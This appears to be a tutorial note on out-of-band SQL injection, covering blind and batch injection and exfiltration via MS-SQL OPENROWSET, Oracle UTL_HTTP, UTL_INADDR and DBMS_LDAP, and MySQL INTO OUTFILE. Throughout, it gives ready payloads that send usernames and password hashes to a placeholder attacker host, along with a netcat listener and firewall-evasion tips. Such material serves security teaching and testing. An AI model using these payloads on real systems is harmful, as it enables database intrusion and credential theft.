# Using an Out-of-Band Channel

When an application **neither returns results** of injected queries **nor displays error messages**, it may appear that SQL injection is unexploitable. However, attackers can still confirm injection and extract data using **out-of-band (OOB) channels**.

---

## **Blind SQL Injection with Executed Queries**

Even without seeing query results:
- You may inject **subqueries** to execute additional logic.
- A **login form** can be exploited using concatenation:
  ```sql
  foo' || (SELECT 1 FROM dual WHERE (SELECT username FROM all_users WHERE username = 'DBSNMP') = 'DBSNMP')--
  ```

- This query will **fail the login** but still execute the subquery.
- The goal: find a channel to receive this result externally.

---

## **Batch Query Injection (MS-SQL Specific)**

- Batch queries allow executing a second independent query.
- Syntax:
  ```sql
  '; SELECT something; --
  ```
- You still need an external way to see the result.

---

## **Out-of-Band Channels for Data Retrieval**

These techniques **leak data outside** the web app, often via **network requests**.

### **MS-SQL**

**`OpenRowSet`**:
```sql
INSERT INTO OPENROWSET(
  'SQLOLEDB',
  'DRIVER={SQL Server};SERVER=attacker.com,80;UID=sa;PWD=pass',
  'SELECT * FROM foo') VALUES (@@version)
```
- Sends data to attacker via outbound SQL connection.
- Choose **commonly open ports (e.g., 80)** to evade firewall restrictions.

---

### **Oracle**

#### **`UTL_HTTP`**
Sends HTTP requests with data embedded in the URL:
```sql
'||UTL_HTTP.request('http://attacker.net/'||(SELECT username FROM all_users WHERE ROWNUM=1))--
```

**Listener:**
```bash
nc -nLp 80
```

#### **`UTL_INADDR`**
Performs **DNS lookups**:
```sql
'||UTL_INADDR.GET_HOST_NAME((SELECT password FROM dba_users WHERE name='SYS')||'.attacker.net')--
```
- Results in:
  ```
  DCB748A5BC5390F2.attacker.net
  ```
- More likely to succeed than HTTP due to **corporate DNS rules**.

#### **`UTL_SMTP`** – Send stolen data via email.

#### **`UTL_TCP`** – Send/receive data over arbitrary TCP sockets.

> **NOTE**: From **Oracle 11g onwards**, ACLs restrict these packages by default.
Use:
```sql
SYS.DBMS_LDAP.INIT((SELECT password FROM sys.user$ WHERE name='SYS')||'.attacker.net', 80)
```

---

### **MySQL**

**`SELECT ... INTO OUTFILE`**:
```sql
SELECT * INTO OUTFILE '\\\\attacker.net\\share\\output.txt' FROM users;
```
- Requires attacker to run an **SMB server** that allows anonymous write.
- Validate with a **sniffer** if connections are initiated but file not received.

---

## **Leveraging the Operating System**

Once command execution is achieved:
- Use OS-level commands like `tftp`, `mail`, or `telnet`.
- Write stolen data to **web root** for browser-based retrieval.
- Covered in detail in the **"Beyond SQL Injection"** section.

---

## **TIP**

Even when no data is visibly returned:
- Look for **network-side effects**.
- **DNS**, **HTTP**, and **SMB** are the most reliable OOB vectors.
- These methods often succeed in **segmented networks** and **firewalled environments**.

---
